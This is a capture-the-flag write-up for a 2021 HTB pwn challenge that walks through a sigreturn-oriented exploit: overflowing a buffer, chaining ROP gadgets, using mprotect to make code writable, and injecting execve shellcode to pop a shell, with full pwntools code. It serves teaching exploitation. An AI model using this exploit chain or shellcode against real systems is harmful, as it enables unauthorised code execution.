<pre style="font-size: 0.4rem; text-align: center">
                                                      *****************************************     
                                                    *********************************************   
                                                    **********************************************  
                                                    *****                                  *******  
                                                    ****                                    ******  
                                                    ****                                    ******  
                                                    ******                                ********  
                                                    **********************************************  
                                                    ****                                    ******  
                               *******              ***                                      *****  
                              *********             ****                                    ******  
                            ************            **********************************************  
                           **************           **********************************************  
                          ****************          ****                                    ******  
                         ***            ****        ***                                      *****  
                        ****             ****        ****                                  *******  
                       *****             *****        ********************************************  
                     *******            *******         ******************************************  
                    ********            ********         *****************************************  
                   *********            *********         ****************************************  
                  **********            ***********        ***********************     ***********  
                 ************           *************       *********************       **********  
                *************           **************       ********************       **********  
               **************           ***************       *********************    ***********  
             ****************           ****************        **********************************  
            *****************           *****************        *********************************  
           ******************          *******************        ********************************  
          *******************          *********************       *******************************  
         *********************        ***********************       ******************************  
        **********************         ***********************       *****************************  
      **********************            ***********************        ***************************  
     **********************              ***********************        **************************  
    ***********************              ************************        *************************  
   *************************             *************************       *************************  
  **************************            ***************************       ************************  
   ***************************        *****************************      *************************  
      **********************************************************         *************************  
                                                                        **************************  
                                                                       ***************************  
                                                                    *****************************           
</pre>

---

This was a pwn challenge rated with 325 points at Cyber Apocalypse 2021 CTF from HTB.
I didn't save the description of the chall but it said something about aliens. 

They only provide a binary. 

---

## First look

The first thing we notice when we open it is how small it is. Only a main function that calls `alarm` and `read`. There is an obvious buffer overflow because we read 0x100 bytes and the stack only expects 0x20 bytes.

![main](/./assets/imgs/main-drop.png)

Let's check the security of the binary:

![Security](/./assets/imgs/security-drop.png)

No canary (we already saw that in the `main` function), no PIC and NX bit.

So we have a very very small program (that means less ROP possibilities), that allows us to store a big amount of data into the stack and that's it.

The name of the challenge give us a clue but the real clue comes in the fact that a function called `sym._syscall` is loaded. The contents are:

```assembly
push rbp
mov rbp, rsp
syscall
ret
```

This is clearly an SROP. We can store more than 248 bytes (which is the size of the frame) and we have a syscall available. Let's do this.

## F

To trigger the `sigreturn` syscall we only need to set the `rax` register to 15 or 0xf and then call the `syscall` function with the frame in the stack.

Then, we can set all the registers to make the `.text` section writable by calling the `memprotect` syscall, redirect to main and write on the `.text` section whatever shellcode we want.

Let's search for a ROP gadget that allow us to set the `rax` register...none.

## The long road

How else could we set the `rax` register? Well, it is used for something else.

It is used as the return value from functions. And the `read` function returns the amount of bytes read. So if we could read only 15 bytes, we could set the `rax` register. 

But the ROP chain is going to be longer, obviously. Only the frame is 248 bytes. 

And we have another problem, the frame is going to use 248 bytes and we can read 0x100 bytes or, in base 10, 256 bytes. We can only use 8 more bytes for the ROP. We definetly need more than 8 bytes.

On the first read we have to store the ROP chain but if we trigger a second read we have to say where to store the data so we should move the `rsp` pointer to somewhere we know.

Let's make a list:

1. Store the ROP chain
2. Move the `rsp` to a static address.
4. Store the frame
5. Read 15 bytes to set the `rax` register.
6. Call the syscall.

Well, we have a gadget we could use to move the `rsp` (I am using [RopGadget](https://github.com/JonathanSalwan/ROPgadget) to get the gadgets) and also another for the `rsi` and `rdi` to set the parameters to the `read` function:

```assembly
0x00000000004005cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004005d3 : pop rdi ; ret
0x00000000004005d1 : pop rsi ; pop r15 ; ret
0x0000000000400416 : ret
```

We could use the `.data` section to redirect the new `rsp` there.

## Building the script

First, import `pwntools` and store all the addresses we need and the offset to the buffer overflow (0x20 + 8 for the `rbp`):

```python
from pwn import *

context.clear(arch="amd64")

offset = b'A' * 0x28
data_address = 0x00601028
read_address = 0x00400440
pop_rdi = 0x00000000004005d3
pop_rsi = 0x00000000004005d1
pop_rsp = 0x00000000004005cd
syscall = 0x0040053b
main = 0x00400541
```

In the first read we are going to store the next part of the ROP in the `.data` section:

> Notice: the read function reads as much data as stated in the argument or if the buffer holds less than that, as much as it is. This means that we have to fill the buffer with the amount of data read (0x100) so we avoid the function reading more than we want.


```python
first_read = offset + p64(pop_rdi) + b'\x00' * 8 + p64(pop_rsi) + p64(data_address) + b'\x00' * 8 + p64(read_address)
redirect_rsp = p64(pop_rsp) + p64(data_address - 8 * 3) 

p.send(first_read + redirect_rsp + b'\x00' * (0x100 - len(first_read + redirect_rsp )))
```

Perfect, now we send the second part of the ROP: another read for the frame, another one for the 0xf in `rax` and finally the call to `syscall`

> I added a bunch of ret just in case it was an ubuntu 18.04 with the movaps issue

```python
second_read = p64(pop_rdi) + p64(0x00) + p64(pop_rsi) + p64(data_address + 8 * 15) + b'\x00' * 8 + p64(ret) + p64(read_address) + p64(pop_rdi) + p64(0x00) + p64(pop_rsi) + p64(data_address + 900) + b'\x00' * 8 + p64(ret) + p64(read_address) + p64(syscall)

p.send(second_read + b'\x00' * (0x100 - (len(second_read))))
```

Perfect, let's send the frame and then the 0xf bytes with the main address so we can return after the `mprotect`. I'm using 0x400000 because of what the manual says about mprotect:

> The implementation may require that addr be a multiple of the page size as returned by sysconf()

```python
frame = SigreturnFrame(kernel="amd64")
frame.rax = 10 # mprotect syscall
frame.rdi = 0x00400000 # base address
frame.rsi = 200 # size
frame.rdx = 7 # permission RDX
frame.rsp = data_address + 900 # where the main address will be
frame.rip = syscall  

p.send(bytes(frame) + b'\x00' * (0x100 - len(frame)))
p.sendline(p64(main) + b'XXXXXX')
sleep(2)
```

> We are adding a sleep of 2 seconds because now we can't send the whole 0x100 bytes to fill the buffer. It is a dirty trick but it works.

Now we are back in the main with the `.text` section writable. Let's write a basic shellcode there to pop a shell. Same as before, ROP to write our input to the `main` function and redirect to that address:

```python
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

first_read = offset + p64(pop_rdi) + b'\x00' * 8 + p64(pop_rsi) + p64(0x00400570) + b'\x00' * 8 + p64(read_address) + p64(0x00400570)

p.send(first_read + b"\x00" * (0x100 - len(first_read)))
p.sendline(shellcode)

p.interactive()
```

And we got it!

![Flag](/./assets/imgs/flag-drop.png)
